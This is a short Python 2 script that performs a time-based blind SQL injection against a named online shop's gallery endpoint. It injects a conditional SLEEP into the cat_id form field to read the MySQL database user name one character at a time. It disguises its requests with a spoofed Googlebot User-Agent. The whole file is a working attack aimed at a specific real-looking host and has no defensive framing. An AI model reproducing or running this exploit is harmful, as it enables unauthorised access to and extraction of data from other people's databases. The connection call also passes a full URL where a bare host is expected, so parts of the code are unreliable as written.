#encoding=utf-8
__author__ = 'Lu'
import httplib
import time
import string
import sys
import random
import urllib
headers = {'Content-Type': 'application/x-www-form-urlencoded',
           'User-Agent': 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)',}
payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'
print '[%s] Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())
user = ''
for i in range(1, 17):
    for payload in payloads:
        s = "cat_id=22) AND if((ascii(mid(lower(user()),%s,1))=%s),SLEEP(5),0) AND (8663=8663&orderBy=1&showtype=list&&virtual_cat_id=" % (i, ord(payload))
        conn = httplib.HTTPConnection('http://shop1.vivo.com.cn:80', timeout=30)
        conn.request(method='POST', url='/gallery-ajax_get_goods.html', body=s, headers=headers)
        start_time = time.time()
        html_doc = conn.getresponse().read()
        conn.close()
        print '.',
        if time.time() - start_time > 1.0:
            user += payload
            print '\n[in progress]', user,
            break
        
print '\n[Done] MySQL user is %s' % user